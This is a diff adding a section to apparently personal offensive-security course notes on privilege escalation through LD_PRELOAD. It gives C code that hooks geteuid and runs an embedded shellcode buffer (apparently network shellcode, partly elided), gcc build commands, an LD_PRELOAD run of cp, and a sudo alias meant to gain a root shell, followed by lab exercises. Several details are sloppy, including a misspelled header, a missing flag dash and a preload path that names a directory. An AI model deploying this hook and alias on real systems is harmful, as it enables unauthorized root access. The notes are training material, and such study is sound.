@@ -566,6 +566,78 @@ after the shell is fired is not necessary in this case.
 
 # Exploit via LD_PRELOAD
 
+LD_PRELOAD is an environment variable which when defined on the system forces the dynamic linking loader to preload a particular shared library before any others.
+
+`ltrace cp`
+
+to get the list of library function calls it uses during normal
+
+`getuid` - this is a good candidate because it seems to only be called once the application is run
+
+`dkfcn.h` - is the header files which defines the functions for interacting with dynamic linking loader
+
+```C
+#define _GNU_SOURCE
+#include <sys/mman.h> // for mprotect
+#include <stdlib.h>
+#include <stdio.h>
+#include <dlfcn.h>
+#include <unistd.h>
+
+char buf[] = "\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
+"\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x85\xc0\x78\x51\x6a\x0a"
+"\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
+....
+"\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6";
+
+uid_t geteuid(void) {
+    typeof(geteuid) *old_geteuid;
+    old_geteuid = dlsym(RTLD_NEXT, "geteuid");
+    if (fork() == 0)
+ {
+    intptr_t pagesize = sysconf(_SC_PAGESIZE);
+    if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)),
+    pagesize, PROT_READ|PROT_EXEC)) {
+    perror("mprotect");
+    return -1;
+    }
+    int (*ret)() = (int(*)())buf;
+    ret();
+    }
+    else
+    {
+    printf("HACK: returning from function...\n");
+    return (*old_geteuid)();
+    }
+    printf("HACK: Returning from main...\n");
+    return -2;
+}
+
+
+```
+
+codes to run
+```
+gcc -Wall fPIC -z execstack -c -o evil_geteuid.o evileuid.c
+gcc -shared -o evil_geteuid.so evil_geteuid.o -ldl
+
+cp /etc/passwd /tmp/testpasswd
+export LD_PRELOAD=/home/kali/Downloads
+cp /etc/passwd /tmp/testpasswd
+unset LD_PRELOAD 
+```
+
+to make it work with sudo
+
+```
+alias sudo="sudo LD_PRELOAD=/home/offsec/evil_geteuid.so"
+```
+
+### 10.3.3.1 Exercises
+1. Compile a malicious library file to hook the geteuid function. Load the library with 
+LD_PRELOAD and get code execution using cp.
+2. Get a root shell using the above malicious library by creating a sudo alias.
+
 
 
 
